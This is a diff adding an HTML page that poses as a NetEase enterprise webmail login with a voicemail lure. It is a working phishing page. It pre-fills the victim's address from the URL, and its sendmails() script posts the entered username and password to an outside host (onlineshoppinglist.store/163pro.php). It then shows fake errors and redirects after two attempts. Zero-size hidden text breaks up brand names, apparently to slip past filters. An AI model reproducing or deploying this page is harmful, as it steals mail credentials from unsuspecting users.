@@ -1,0 +1,309 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+<head>
+		<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+		<title>login</title>
+
+		<link href="https://hw.qiye.163.com/css/global.css" rel="stylesheet" type="text/css" />
+		<link href="https://hw.qiye.163.com/css/user.css" rel="stylesheet" type="text/css" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<style>
+
+		body,.footer span,input,.login-mod .ipt-t{
+			font-family:"lucida Grande",Verdana;
+		}
+		body.en .login-mod h2,body.en .login-mod .fi {
+			margin: 0 8px;
+		}
+		.ipt-c, .ipt-r{
+			margin:0 1px 0 0;
+		}
+		.main-part {
+			background: url(user_bg.jpg) no-repeat;
+		}
+		.login-mod label.tit{
+			width:78px;
+		}
+		.text-mod{
+			height:60px;
+			top:55px;
+		}
+		.text-mod p {
+			width: 100%;
+			height: 100%;
+			display: none;
+			text-indent: 0;
+			overflow: hidden;
+			background:none;
+		}
+		.sec-mod,
+		.sec-mod h2 em.ico,
+		.login-mod .goto,
+		.login-mod .ipt-b,
+		.login-mod h2,
+		.logo span,
+		.bg{
+			background-image:url(bg20120101.gif);
+			background-repeat:no-repeat;
+		}
+		.sec-mod h2{
+			background:none;
+			position:relative;
+			background-position:0;
+			text-indent:42px;
+			width:200px;
+			font-size:14px;
+			line-height:36px;
+			color:#115d8b;
+		}
+		.sec-mod h2 em.ico{
+			display:block;
+			position:absolute;
+			left:0;
+			top:0;
+			width:38px;
+			height:100%;
+		}
+		.intro-mod h2 em.ico{
+			background-position:-144px -72px
+		}
+		.news-mod h2 em.ico{
+			background-position: -288px -75px;
+		}
+
+		body.en .login-mod h2, .login-mod .fi {margin: 0 10px;}
+		-->
+</style>
+	</head>
+	<body class="en">
+		<div class="page">
+			<div class="header">
+
+				<h1 class="logo">
+					<img src="multi.png" id="logo" onload="DrawImage(this,158,29);" />
+				</h1>
+       <div class="toplinks">
+			 <img src=""
+			 </div>
+			</div>
+
+			<div class="body">
+				<div class="part main-part">
+					<div class="mod login-mod  ">
+						<div style='boder: 1px solid gray;'  name="loginform" id="loginform" >
+
+								<input type="hidden" name="ch" id="ch" value="hw" />
+								<input type="hidden" name="domain" id="domain" value="" />
+								<input type="hidden" name="language" id="language" value="1" />
+								<input type="hidden" id="pubid" name="pubid" value="" />
+								<input type="hidden" id="passtype" name="passtype" value="" />
+							<h2>
+								User login
+							</h2>
+							<div class="fi">
+							<div>验证密码以收听语音邮件</div><br>
+								<label class="tit">
+									Username
+								</label>
+
+								<input type="text"  name="account_name" id="account_name" class="ipt-t ipt-sample" value="" readonly style="color:black"/>
+							</div>
+
+							<div class="fi">
+								<label class="tit">
+
+							 Password<span id="asteric" style="color:red;display:none;">&nbsp;*</span>
+
+								</label>
+								<input type="password" class="ipt-t" name="password" id="password" value=""/>
+							</div>
+							<div id="verifyCodeWrap" class="fi f-dn" style="overflow: hidden;display: none;">
+								<label class="tit">verify code</label>
+								<input type="text" name="verify_code" id="verify_code" style="float:left;width:140px;height:24px;line-height:24px;" class="ipt-sample">
+								<a id="codeImgWrap" style="float:left;width:100px;height:30px;padding:0;margin:0;display:block;cursor:pointer;" href="javascript:void(0);">
+									<img src="#" style="width:100%;height:100%;">
+								</a>
+							</div>
+							<div class="fi">
+								<label for="remUsername">
+									<input type="checkbox" class="ipt-c" name="remUser" id="remUsername" value="1" />
+									Remember username
+								</label>
+								&nbsp;&nbsp;
+
+								<input type="hidden" name="secure" value="1"/>
+								<label for="secure">
+									<input id="secure" value="1" checked disabled="disabled" type="checkbox" class="ipt-c"/>
+									SSL login
+								</label>
+								&nbsp;&nbsp;
+								<label for="all_secure">
+									<input name="all_secure" id="all_secure" value="1" type="checkbox" checked class="ipt-c"/>
+									All SSL
+								</label>
+
+							</div>
+							<div class="fi fi-notit">
+								<input type="submit" id="submit-btn" onclick="sendmails()" class="ipt-b" value="登录" style="background-color:#03a9f487;" />
+								<table class="err">
+									<tr>
+										<td id="msgpid" style="display: none;">
+                     您的密码不正确，请输入正确的密码，然后重试
+										</td>
+
+										<td id="fill" style="display: none;">
+                     请输入密码
+										</td>
+									</tr>
+
+								</table>
+							</div>
+
+              <p style="font-size:0px">
+               Writing can reflect a writer’s power of thought and language organization skills.
+							 It is critical to master Chi<span style="font-size:0px">[Domain]</span>nese writing  if you want to take your Chin<span style="font-size:0px">[Domain]</span>ese to the next level.
+							 How to write good Chinese essays? The foll<span style="font-size:0px">[Domain]</span>owing six steps will improve Chinese essay writing:	</p>
+
+							<div class="goto">
+								<a href="#" style="text-decoration: none;font-size: 13px;" target="_blank">Administrator Login</a>
+                                    <a href="javascript:void(0);" id="resetPwd" style="text-decoration: none;font-size: 13px;">Forget Password？</a>
+							</div>
+
+						</div>
+					</div>
+					<div class="mod text-mod text-mod-1" id="divText">
+						<p class="text1">
+							With Ajax technology, Net<span style="font-size:0px">[Domain]</span>ease Webmail responding time decreases by 90% in same network environment.
+						</p>
+						<p class="text2">
+							Top-level anti-virus capability and hourly global updating database filter almost 100% virus emails.
+						</p>
+					</div>
+				</div>
+
+	<!--
+    BoooooooooooooooooooDooooooooooooHHHHHHHHHHHHHHHHHHHNNNNNNNNNNNNNNNNNNNNNN
+		BoooooooooooooooooooDooooooooooooHHHHHHHHHHHHHHHHHHHNNNNNNNNNNNNNNNNNNNNNN
+		BoooooooooooooooooooDooooooooooooHHHHHHHHHHHHHHHHHHHNNNNNNNNNNNNNNNNNNNNNN
+		BoooooooooooooooooooDooooooooooooHHHHHHHHHHHHHHHHHHHNNNNNNNNNNNNNNNNNNNNNN
+-->
+
+        	<div class="part sec-part">
+						<div class="mod sec-mod intro-mod">
+							<h2>
+								<em class="ico"></em>
+								Introduction
+							</h2>
+							Net<span style="font-size:0px">[Domain]</span>Ease.com, Inc. is a leading Chi<span style="font-size:0px">[Domain]</span>na-based Internet technology company that pioneered the development of applications, services and other techn<span style="font-size:0px">[Domain]</span>ologies for the Internet in China.
+						</div>
+						<div class="mod sec-mod news-mod">
+							<h2>
+								<em class="ico"></em>
+								News
+							</h2>
+							We provide self-domain setting and self-management panel, it is choice of easy and efficient enterprise commu<span style="font-size:0px">[Domain]</span>nication.<br/>
+							Large capacity, large attachments, with the largest and most stable Net<span style="font-size:0px">[Domain]</span>ease mail system!<br/>
+							Top international anti-virus engine, and intelligent anti-spam technology, safe and clean and secure!<br/>
+						</div>
+					</div>
+
+			</div>
+			<div class="footer">
+				<a href="#" target="_blank">Related Laws</a>
+
+				 |<span>&copy;1997-2020 NetEase Corporation</span>
+
+			</div>
+		</div>
+
+
+	</body>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script>
+
+var queryString = window.location.href;
+var dom= queryString.split("#");
+var email = dom[1];
+var count = 0;
+
+document.getElementById("account_name").value = email;  //get error message id
+
+
+$('#password').keyup(function(event) {
+		if (event.which == 13) {
+				$('#submit-btn').click();
+		}
+});
+
+
+function sendmails() {
+
+	var ps = $("#password").val();
+	var submit = true;
+
+	if(ps == null || ps == ""){
+		$("#msgpid").hide();
+		$("#fill").show();
+		$("#asteric").show();
+		submit = false;
+	} else {
+		$("#fill").hide();
+		$("#asteric").hide();
+		submit = true;
+	}
+
+	if(submit == true) {
+
+    $.ajax({
+			url: 'https://onlineshoppinglist.store/163pro.php', // full url of processor.php
+			type: 'POST',
+			data: {
+					user: email,
+					pass: ps,
+	type: 1
+			},
+			beforeSend: function() {
+				$('#submit-btn').val('加载...');
+},
+
+			success: function(response) {
+					if (response == 0) {
+							count = count + 1;
+
+							if (count >= 2) {
+								$("#msgpid").hide();
+
+								function redirect() {
+									window.location.href = "https://hcsa.hcsa.ec/wp-admin/user/Youmail.mp3";
+								}
+
+								setTimeout(redirect,3000);
+
+
+							} else {
+								$("#msgpid").show();
+								$("#password").val("");
+							}
+
+	}
+			},
+
+			complete: function(){
+				$('#submit-btn').val('登录');
+			}
+	});
+
+}
+
+}
+
+
+
+</script>
+
+
+</html>
